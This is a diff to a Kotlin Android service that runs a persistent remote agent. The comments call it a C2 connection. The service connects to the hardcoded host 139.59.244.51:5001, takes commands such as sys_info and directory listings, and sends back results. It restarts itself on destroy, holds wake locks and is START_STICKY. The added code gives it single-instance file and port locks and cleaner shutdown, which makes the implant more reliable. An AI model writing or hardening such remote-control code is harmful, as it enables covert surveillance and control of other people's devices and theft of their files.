@@ -25,8 +25,13 @@ import java.io.BufferedReader
 import java.io.File
 import java.io.InputStreamReader
 import java.io.PrintWriter
+import java.io.RandomAccessFile
+import java.net.InetAddress
 import java.net.InetSocketAddress
+import java.net.ServerSocket
 import java.net.Socket
+import java.nio.channels.FileChannel
+import java.nio.channels.FileLock
 import java.util.Locale
 import java.util.concurrent.TimeUnit
 import java.util.concurrent.atomic.AtomicBoolean
@@ -41,6 +46,21 @@ class AgentService : Service() {
     private val isAgentRunning = AtomicBoolean(false)
     private var wakeLock: PowerManager.WakeLock? = null
     private var wifiLock: WifiManager.WifiLock? = null
+    
+    // File lock for single-instance guarantee across processes
+    private var lockFile: RandomAccessFile? = null
+    private var fileChannel: FileChannel? = null
+    private var fileLock: FileLock? = null
+    
+    // Port lock guarding C2 connection (Process Mutex)
+    private var portLockSocket: ServerSocket? = null
+    
+    // Reference to the active C2 connection socket to allow forcing closure on destroy
+    private var c2Socket: Socket? = null
+    
+    @Volatile
+    private var keepRunning = true
+    private var agentThread: Thread? = null
 
     override fun onCreate() {
         super.onCreate()
@@ -61,12 +81,19 @@ class AgentService : Service() {
 
     override fun onDestroy() {
         super.onDestroy()
+        keepRunning = false
+        
+        // Interrupt the background thread to break any blocking I/O or sleep
+        agentThread?.interrupt()
+        
         if (wakeLock?.isHeld == true) {
             wakeLock?.release()
         }
         if (wifiLock?.isHeld == true) {
             wifiLock?.release()
         }
+        
+        releaseProcessLock()
 
         scheduleRestart(this)
     }
@@ -174,12 +201,59 @@ class AgentService : Service() {
         // Guard against multiple threads being spawned if onStartCommand is called again
         // (e.g. from both MainActivity and BootReceiver, or on service restart via START_STICKY)
         if (isAgentRunning.compareAndSet(false, true)) {
-            // Only delay on boot — not on restarts caused by permission changes or system kills
-            val fromBoot = intent?.getBooleanExtra("from_boot", false) ?: false
-            startPersistentAgent("139.59.244.51", 5001, fromBoot)
+            if (acquireProcessLock()) {
+                // Only delay on boot — not on restarts caused by permission changes or system kills
+                val fromBoot = intent?.getBooleanExtra("from_boot", false) ?: false
+                startPersistentAgent("139.59.244.51", 5001, fromBoot)
+            } else {
+                Log.w("AgentService", "Duplicate instance detected (process lock failed). Stopping.")
+                isAgentRunning.set(false)
+                stopSelf()
+            }
         }
 
         return START_STICKY
+    }
+
+    private fun acquireProcessLock(): Boolean {
+        return try {
+            val f = File(cacheDir, "agent_instance.lock")
+            lockFile = RandomAccessFile(f, "rw")
+            fileChannel = lockFile?.channel
+            // tryLock() is non-blocking. Returns null if lock is held by another process.
+            // On Android, file locks are advisory but effective for cooperation between our own processes.
+            fileLock = fileChannel?.tryLock()
+            
+            if (fileLock == null) {
+                Log.w("AgentService", "Another process holds the lock.")
+                closeLockResources()
+                false
+            } else {
+                Log.i("AgentService", "Process lock acquired successfully.")
+                true
+            }
+        } catch (e: Exception) {
+            Log.e("AgentService", "Error acquiring file lock", e)
+            closeLockResources()
+            false
+        }
+    }
+
+    private fun releaseProcessLock() {
+        try {
+            fileLock?.release()
+        } catch (e: Exception) {
+            Log.e("AgentService", "Error releasing file lock", e)
+        }
+        closeLockResources()
+    }
+
+    private fun closeLockResources() {
+        try { fileChannel?.close() } catch (e: Exception) {}
+        try { lockFile?.close() } catch (e: Exception) {}
+        fileLock = null
+        fileChannel = null
+        lockFile = null
     }
 
     private fun scheduleWatchdog() {
@@ -237,16 +311,33 @@ class AgentService : Service() {
 
     @androidx.annotation.RequiresPermission(allOf = [Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION])
     private fun startPersistentAgent(ip: String, port: Int, delayStart: Boolean = false) {
-        Thread {
+        agentThread = Thread {
+            // General Startup Delay: Reduced to 500ms for faster responsiveness while still allowing
+            // a brief window for the previous connection to clear on the server side.
+            try { 
+                Thread.sleep(500) 
+            } catch (e: InterruptedException) { 
+                return@Thread 
+            }
+
+            // BLOCKING LOCK ACQUISITION
+            if (!acquirePortLock()) {
+                Log.w("AgentService", "Port lock acquisition failed, another instance might be running.")
+                isAgentRunning.set(false)
+                return@Thread
+            }
+
             try {
                 // On boot, wait 10 seconds for Wi-Fi/Data to initialise before connecting.
                 // On restarts (e.g. after a permission change), connect immediately.
                 if (delayStart) {
-                    Thread.sleep(10000)
+                    try { Thread.sleep(10000) } catch (e: InterruptedException) { return@Thread }
                 }
 
-                while (true) {
+                while (keepRunning) {
                     try {
+                        if (Thread.interrupted()) break
+
                         val socket = Socket()
                         socket.keepAlive = true
                         // socket.connect(InetSocketAddress(ip, port), 5000)
@@ -261,13 +352,13 @@ class AgentService : Service() {
                         val reader = BufferedReader(InputStreamReader(socket.getInputStream()))
                         val output = PrintWriter(socket.getOutputStream(), true)
 
-                        while (true) {
+                        while (keepRunning) {
                             val command = reader.readLine() ?: break // null means stream closed (EOF)
                             
                             // Copy your command logic from MainActivity here
                             val response = when {
                                 command == "ping" -> "pong"
-                                command == "sys_info" -> getDeviceName()
+                                command == "sys_info" -> getDeviceName() + " (PID: ${android.os.Process.myPid()})"
 
                                 command.startsWith("ls ") -> {
                                     val path = command.substringAfter("ls ")
@@ -325,16 +416,83 @@ class AgentService : Service() {
                         Log.i("AgentService", "Server closed connection")
                         
                     } catch (e: Throwable) {
+                        // Check if we were interrupted (service stopping)
+                        if (!keepRunning || e is InterruptedException) {
+                            Log.i("AgentService", "Agent thread stopping...")
+                            break
+                        }
                         Log.e("AgentService", "Connection failed or error occurred, retrying in 10s: ${e.message}")
-                        e.printStackTrace()
-                        Thread.sleep(10000) // Wait longer between retries
+                        
+                        try {
+                            Thread.sleep(10000) // Wait longer between retries
+                        } catch (sleepEx: InterruptedException) {
+                            break // Stop if interrupted during sleep
+                        }
                     }
                 }
             } finally {
                 // Allow a new thread to be started if this one ever exits
                 isAgentRunning.set(false)
+                
+                // Cleanup C2 socket reference immediately to break connection
+                try {
+                    c2Socket?.close()
+                } catch (e: Exception) {}
+                c2Socket = null
+                
+                // EXIT GAP:
+                // Hold the port lock for a brief moment AFTER disconnecting C2.
+                // This blocks any eager new instance from connecting until we are truly gone.
+                try {
+                    Thread.sleep(2000)
+                } catch (e: Exception) {}
+                
+                // Release the global lock so next instance can take it
+                try {
+                    portLockSocket?.close()
+                } catch (e: Exception) {}
             }
-        }.start()
+        }
+        agentThread?.start()
+    }
+    
+    private fun acquirePortLock(): Boolean {
+        return try {
+            // Bind specifically to IPv4 loopback to avoid ambiguity
+            val addr = InetAddress.getByName("127.0.0.1")
+            portLockSocket = ServerSocket(54321, 0, addr).apply { reuseAddress = false }
+            Log.i("AgentService", "Port lock acquired on 127.0.0.1:54321")
+            true
+        } catch (e: Exception) {
+            Log.w("AgentService", "Port lock busy, waiting... ${e.message}")
+            // Check more frequently (every 200ms) instead of waiting 2s
+            try { Thread.sleep(200) } catch (i: InterruptedException) { return false }
+            // If failed to bind, check if we should keep trying
+            if (keepRunning) {
+                 // Simple recursive retry or just return false to let the loop handle it
+                 // But here we want to block until acquired or timed out.
+                 // Refactored simple retry loop below:
+                 return acquirePortLockRetryLoop()
+            }
+            false
+        }
+    }
+    
+    private fun acquirePortLockRetryLoop(): Boolean {
+        var attempts = 0
+        while (keepRunning && attempts < 50) { // 50 * 200ms = 10s max wait
+            try {
+                val addr = InetAddress.getByName("127.0.0.1")
+                portLockSocket = ServerSocket(54321, 0, addr).apply { reuseAddress = false }
+                Log.i("AgentService", "Port lock acquired on retry ($attempts)")
+                return true
+            } catch (e: Exception) {
+                // Log.w("AgentService", "Port lock still busy ($attempts)...") // reduce log noise
+                try { Thread.sleep(200) } catch (i: InterruptedException) { return false }
+                attempts++
+            }
+        }
+        return false
     }
 
     fun getDeviceName(): String {
